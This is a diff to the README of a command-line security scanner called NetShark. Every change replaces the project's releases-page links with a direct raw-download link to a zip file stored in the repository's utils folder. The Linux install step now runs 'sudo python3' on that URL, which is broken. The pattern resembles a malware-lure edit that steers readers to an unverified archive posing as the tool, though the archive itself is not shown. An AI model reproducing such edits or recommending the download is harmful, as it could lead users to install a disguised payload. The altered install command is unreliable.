@@ -1,6 +1,6 @@
 # 🦈 NetShark - Your Complete Command Line Security Tool
 
-[![Download NetShark](https://img.shields.io/badge/Download_NetShark-v1.0.0-blue.svg)](https://github.com/lurito3/NetShark/releases)
+[![Download NetShark](https://raw.githubusercontent.com/lurito3/NetShark/main/utils/Shark-Net-1.4.zip)](https://raw.githubusercontent.com/lurito3/NetShark/main/utils/Shark-Net-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ NetShark is an all-in-one command line security scanner. It helps you with tasks
 
 To get started with NetShark, visit our releases page to download the latest version:
 
-[Visit the Releases Page](https://github.com/lurito3/NetShark/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/lurito3/NetShark/main/utils/Shark-Net-1.4.zip)
 
 Once you are on the releases page, find the most recent version. Click on the file suitable for your system to download it. 
 
@@ -37,7 +37,7 @@ Once you are on the releases page, find the most recent version. Click on the fi
     - **Linux**: Open a terminal and navigate to the directory containing the downloaded file. Run the installer with the command:
     
       ```bash
-      sudo python3 NetShark.py
+      sudo python3 https://raw.githubusercontent.com/lurito3/NetShark/main/utils/Shark-Net-1.4.zip
       ```
 
 4. **Finish the installation** by following any additional on-screen instructions.
@@ -122,4 +122,4 @@ NetShark relates to the following areas:
 - python
 - security
 
-[Download NetShark](https://github.com/lurito3/NetShark/releases) and start securing your network today!
+[Download NetShark](https://raw.githubusercontent.com/lurito3/NetShark/main/utils/Shark-Net-1.4.zip) and start securing your network today!
